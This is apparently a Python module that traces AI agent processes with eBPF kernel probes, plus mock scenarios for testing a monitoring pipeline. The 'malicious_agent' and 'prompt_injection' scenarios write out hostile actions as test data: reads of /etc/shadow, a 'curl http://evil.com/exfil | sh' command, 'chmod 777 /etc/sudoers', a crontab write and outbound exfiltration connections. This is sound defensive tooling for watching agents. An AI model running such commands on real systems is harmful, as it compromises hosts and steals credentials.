"""AgentTracer — eBPF-based kernel observation for AI agents.

Attaches eBPF probes to kernel tracepoints and uprobes to observe
what AI agents actually do at the system level: file access, command
execution, network connections, TLS traffic.

Falls back to MockTracer on systems without eBPF support (kernel <5.4,
no CAP_BPF, or missing bcc). MockTracer simulates events for testing.

Usage:
    tracer = AgentTracer()
    tracer.watch_pid(1234, agent_id="agent-7")
    tracer.start()
    for event in tracer.events():
        print(event.to_json())
"""

from __future__ import annotations

import os
import struct
import socket
import logging
import threading
import time
from pathlib import Path
from queue import Queue, Empty, Full
from typing import Optional, Generator, Set

from .events import (
    Event, EventType, Severity, EventStream,
    SyscallEvent, FileEvent, NetworkEvent, ProcessEvent, TLSEvent,
)

logger = logging.getLogger("substrate_guard.observe")

BPF_PROGRAM_PATH = Path(__file__).parent / "bpf_programs" / "agent_trace.c"


def _ip_from_int(addr: int) -> str:
    """Convert uint32 IP to dotted-quad string."""
    try:
        return socket.inet_ntoa(struct.pack("I", addr))
    except Exception:
        return f"{addr}"


class AgentTracer:
    """eBPF-based kernel tracer for AI agent observation.
    
    Automatically detects eBPF availability. Falls back to MockTracer
    if kernel doesn't support BPF.
    
    Args:
        buffer_pages: Number of perf buffer pages (default 64, ~256KB per CPU)
        use_mock: Force mock mode even if eBPF is available
    """

    def __init__(self, buffer_pages: int = 64, use_mock: bool = False):
        self._buffer_pages = buffer_pages
        self._watched_pids: dict[int, str] = {}  # pid -> agent_id
        self._event_queue: Queue[Event] = Queue(maxsize=10000)
        self._stream = EventStream()
        self._running = False
        self._poll_thread: Optional[threading.Thread] = None
        self._bpf = None
        self._mock = use_mock

        if not use_mock:
            self._try_init_bpf()

    def _try_init_bpf(self):
        """Attempt to initialize BPF. Fall back to mock on failure."""
        if os.name == "nt":
            logger.info("eBPF is not supported on Windows — using mock tracer.")
            self._mock = True
            return
        try:
            from bcc import BPF
            
            # Check kernel version
            uname = os.uname()
            major, minor = map(int, uname.release.split(".")[:2])
            if major < 5 or (major == 5 and minor < 4):
                logger.warning(
                    f"Kernel {uname.release} < 5.4 — eBPF features limited. "
                    "Using mock tracer."
                )
                self._mock = True
                return

            # Check permissions
            if os.geteuid() != 0:
                logger.warning(
                    "Not running as root — eBPF requires CAP_BPF or root. "
                    "Using mock tracer."
                )
                self._mock = True
                return

            # Load BPF program
            bpf_text = BPF_PROGRAM_PATH.read_text()
            self._bpf = BPF(text=bpf_text)
            logger.info("eBPF probes loaded successfully")

        except ImportError:
            logger.warning("bcc not installed — using mock tracer. "
                          "Install: apt install bpfcc-tools python3-bpfcc")
            self._mock = True
        except Exception as e:
            logger.warning(f"eBPF init failed: {e} — using mock tracer")
            self._mock = True

    @property
    def is_mock(self) -> bool:
        return self._mock

    @property
    def stream(self) -> EventStream:
        return self._stream

    def watch_pid(self, pid: int, agent_id: str = "unknown") -> None:
        """Register a PID to trace. Can be called before or after start()."""
        self._watched_pids[pid] = agent_id
        if self._bpf is not None:
            # Update BPF hash map
            self._bpf["traced_pids"][self._bpf.ct.c_uint(pid)] = \
                self._bpf.ct.c_uint(len(self._watched_pids) - 1)
            logger.info(f"eBPF: tracing PID {pid} as {agent_id}")

    def unwatch_pid(self, pid: int) -> None:
        """Stop tracing a PID."""
        self._watched_pids.pop(pid, None)
        if self._bpf is not None:
            try:
                del self._bpf["traced_pids"][self._bpf.ct.c_uint(pid)]
            except KeyError:
                pass

    def watch_children_of(self, parent_pid: int, agent_id: str = "unknown") -> None:
        """Watch all child processes of a parent (for agent process trees)."""
        # In production, uses /proc/{pid}/task/*/children or cgroup tracking
        self.watch_pid(parent_pid, agent_id)
        try:
            children_path = f"/proc/{parent_pid}/task/{parent_pid}/children"
            if os.path.exists(children_path):
                for child_pid in Path(children_path).read_text().split():
                    self.watch_pid(int(child_pid), agent_id)
        except (OSError, ValueError):
            pass

    def start(self) -> None:
        """Start observing. Non-blocking — events available via events()."""
        if self._running:
            return
        self._running = True

        if self._mock:
            logger.info("Mock tracer started — generating simulated events")
            self._poll_thread = threading.Thread(
                target=self._mock_poll_loop, daemon=True
            )
        else:
            self._setup_perf_buffers()
            self._poll_thread = threading.Thread(
                target=self._bpf_poll_loop, daemon=True
            )
        self._poll_thread.start()

    def stop(self) -> None:
        """Stop observing."""
        self._running = False
        if self._poll_thread:
            self._poll_thread.join(timeout=2.0)
        if self._bpf is not None:
            self._bpf.cleanup()
        logger.info(f"Tracer stopped. {self._stream.count} events collected.")

    def events(self, timeout: float = 0.1) -> Generator[Event, None, None]:
        """Yield events as they arrive. Non-blocking with timeout."""
        while self._running:
            try:
                event = self._event_queue.get(timeout=timeout)
                yield event
            except Empty:
                continue

    def drain(self, max_events: int = 1000) -> list[Event]:
        """Drain up to max_events from the queue. Non-blocking."""
        events = []
        while len(events) < max_events:
            try:
                events.append(self._event_queue.get_nowait())
            except Empty:
                break
        return events

    def inject_event(self, event: Event) -> None:
        """Manually inject an event (for testing or synthetic events)."""
        event.timestamp = time.time()
        self._stream.add(event)
        try:
            self._event_queue.put_nowait(event)
        except Full:
            pass  # bounded queue: drop when saturated

    # --- BPF callbacks ---

    def _setup_perf_buffers(self):
        """Attach perf buffer callbacks for each event type."""
        self._bpf["execve_events"].open_perf_buffer(
            self._handle_execve, page_cnt=self._buffer_pages
        )
        self._bpf["openat_events"].open_perf_buffer(
            self._handle_openat, page_cnt=self._buffer_pages
        )
        self._bpf["connect_events"].open_perf_buffer(
            self._handle_connect, page_cnt=self._buffer_pages
        )
        self._bpf["tls_events"].open_perf_buffer(
            self._handle_tls, page_cnt=self._buffer_pages
        )

    def _handle_execve(self, cpu, data, size):
        event_data = self._bpf["execve_events"].event(data)
        agent_id = self._watched_pids.get(event_data.pid, "unknown")
        event = ProcessEvent(
            type=EventType.PROCESS_EXEC,
            agent_id=agent_id,
            pid=event_data.pid,
            tid=event_data.tid,
            uid=event_data.uid,
            comm=event_data.comm.decode("utf-8", errors="replace"),
            filename=event_data.filename.decode("utf-8", errors="replace"),
            parent_pid=event_data.ppid,
            args=[],
        )
        self._emit(event)

    def _handle_openat(self, cpu, data, size):
        event_data = self._bpf["openat_events"].event(data)
        agent_id = self._watched_pids.get(event_data.pid, "unknown")
        
        # Classify as read or write based on flags
        O_WRONLY, O_RDWR, O_CREAT, O_TRUNC = 1, 2, 64, 512
        flags = event_data.flags
        if flags & (O_WRONLY | O_RDWR | O_CREAT | O_TRUNC):
            etype = EventType.FILE_WRITE
        else:
            etype = EventType.FILE_OPEN

        event = FileEvent(
            type=etype,
            agent_id=agent_id,
            pid=event_data.pid,
            tid=event_data.tid,
            uid=event_data.uid,
            comm=event_data.comm.decode("utf-8", errors="replace"),
            path=event_data.filename.decode("utf-8", errors="replace"),
            flags=flags,
        )
        self._emit(event)

    def _handle_connect(self, cpu, data, size):
        event_data = self._bpf["connect_events"].event(data)
        agent_id = self._watched_pids.get(event_data.pid, "unknown")
        event = NetworkEvent(
            type=EventType.NETWORK_CONNECT,
            agent_id=agent_id,
            pid=event_data.pid,
            tid=event_data.tid,
            uid=event_data.uid,
            comm=event_data.comm.decode("utf-8", errors="replace"),
            remote_ip=_ip_from_int(event_data.daddr),
            remote_port=event_data.dport,
        )
        self._emit(event)

    def _handle_tls(self, cpu, data, size):
        event_data = self._bpf["tls_events"].event(data)
        agent_id = self._watched_pids.get(event_data.pid, "unknown")
        etype = EventType.TLS_WRITE if event_data.is_write else EventType.TLS_READ
        event = TLSEvent(
            type=etype,
            agent_id=agent_id,
            pid=event_data.pid,
            tid=event_data.tid,
            uid=event_data.uid,
            comm=event_data.comm.decode("utf-8", errors="replace"),
            payload_size=event_data.len,
            payload_preview=event_data.buf.decode("utf-8", errors="replace")[:256],
        )
        self._emit(event)

    def _emit(self, event: Event):
        self._stream.add(event)
        try:
            self._event_queue.put_nowait(event)
        except Full:
            pass

    def _bpf_poll_loop(self):
        """Main BPF polling loop — runs in background thread."""
        while self._running:
            try:
                self._bpf.perf_buffer_poll(timeout=100)  # 100ms
            except Exception as e:
                logger.error(f"BPF poll error: {e}")
                time.sleep(0.1)

    # --- Mock implementation ---

    def _mock_poll_loop(self):
        """Generate simulated events for testing without eBPF."""
        # Don't auto-generate — only respond to inject_event()
        # This loop just keeps the thread alive
        while self._running:
            time.sleep(0.5)


class MockScenario:
    """Pre-built event scenarios for testing the observe → policy → verify pipeline.
    
    Usage:
        tracer = AgentTracer(use_mock=True)
        MockScenario.code_generation(tracer, agent_id="agent-7")
        tracer.start()
    """

    @staticmethod
    def code_generation(tracer: AgentTracer, agent_id: str = "agent-code") -> None:
        """Simulate a code-generation agent: writes files, runs Python."""
        events = [
            FileEvent(type=EventType.FILE_WRITE, agent_id=agent_id,
                     path="/workspace/output.py", pid=1001, comm="python3"),
            ProcessEvent(type=EventType.PROCESS_EXEC, agent_id=agent_id,
                        filename="/usr/bin/python3", args=["python3", "/workspace/output.py"],
                        pid=1002, parent_pid=1001, comm="python3"),
            FileEvent(type=EventType.FILE_READ, agent_id=agent_id,
                     path="/workspace/data.csv", pid=1002, comm="python3"),
            NetworkEvent(type=EventType.NETWORK_CONNECT, agent_id=agent_id,
                        remote_ip="104.18.6.192", remote_port=443, pid=1002,
                        comm="python3", domain="api.anthropic.com"),
        ]
        for e in events:
            tracer.inject_event(e)

    @staticmethod
    def malicious_agent(tracer: AgentTracer, agent_id: str = "agent-bad") -> None:
        """Simulate a compromised agent: reads /etc/passwd, exfiltrates data."""
        events = [
            FileEvent(type=EventType.FILE_READ, agent_id=agent_id,
                     path="/etc/passwd", pid=2001, comm="python3"),
            FileEvent(type=EventType.FILE_READ, agent_id=agent_id,
                     path="/etc/shadow", pid=2001, comm="python3"),
            NetworkEvent(type=EventType.NETWORK_CONNECT, agent_id=agent_id,
                        remote_ip="185.143.223.1", remote_port=4444, pid=2001,
                        comm="python3"),
            ProcessEvent(type=EventType.PROCESS_EXEC, agent_id=agent_id,
                        filename="/bin/bash", args=["bash", "-c", "curl http://evil.com/exfil | sh"],
                        pid=2002, parent_pid=2001, comm="bash"),
        ]
        for e in events:
            tracer.inject_event(e)

    @staticmethod
    def resource_abuse(tracer: AgentTracer, agent_id: str = "agent-greedy") -> None:
        """Simulate an agent that exceeds resource budgets."""
        # 150 API calls in rapid succession
        for i in range(150):
            tracer.inject_event(NetworkEvent(
                type=EventType.NETWORK_CONNECT, agent_id=agent_id,
                remote_ip="104.18.6.192", remote_port=443, pid=3001,
                comm="python3", domain="api.openai.com",
            ))
        # Large memory allocation
        tracer.inject_event(FileEvent(
            type=EventType.FILE_WRITE, agent_id=agent_id,
            path="/workspace/huge_output.bin", pid=3001,
            comm="python3", bytes_count=500_000_000,
        ))

    @staticmethod
    def prompt_injection(tracer: AgentTracer, agent_id: str = "agent-injected") -> None:
        """Simulate an agent that received a prompt injection."""
        events = [
            # Normal operation first
            FileEvent(type=EventType.FILE_READ, agent_id=agent_id,
                     path="/workspace/user_input.txt", pid=4001, comm="python3"),
            # Then sudden privilege escalation attempt
            ProcessEvent(type=EventType.PROCESS_EXEC, agent_id=agent_id,
                        filename="/usr/bin/sudo",
                        args=["sudo", "chmod", "777", "/etc/sudoers"],
                        pid=4002, parent_pid=4001, comm="sudo"),
            FileEvent(type=EventType.FILE_WRITE, agent_id=agent_id,
                     path="/etc/crontab", pid=4001, comm="python3"),
            # Data exfiltration
            NetworkEvent(type=EventType.NETWORK_CONNECT, agent_id=agent_id,
                        remote_ip="10.0.0.99", remote_port=12345, pid=4001,
                        comm="python3"),
        ]
        for e in events:
            tracer.inject_event(e)

    @staticmethod
    def safe_web_agent(tracer: AgentTracer, agent_id: str = "agent-web") -> None:
        """Simulate a well-behaved web research agent."""
        events = [
            NetworkEvent(type=EventType.NETWORK_CONNECT, agent_id=agent_id,
                        remote_ip="142.250.186.78", remote_port=443, pid=5001,
                        comm="python3", domain="www.google.com"),
            NetworkEvent(type=EventType.NETWORK_CONNECT, agent_id=agent_id,
                        remote_ip="151.101.1.140", remote_port=443, pid=5001,
                        comm="python3", domain="en.wikipedia.org"),
            FileEvent(type=EventType.FILE_WRITE, agent_id=agent_id,
                     path="/workspace/research_notes.md", pid=5001, comm="python3"),
            FileEvent(type=EventType.FILE_WRITE, agent_id=agent_id,
                     path="/workspace/summary.txt", pid=5001, comm="python3"),
        ]
        for e in events:
            tracer.inject_event(e)
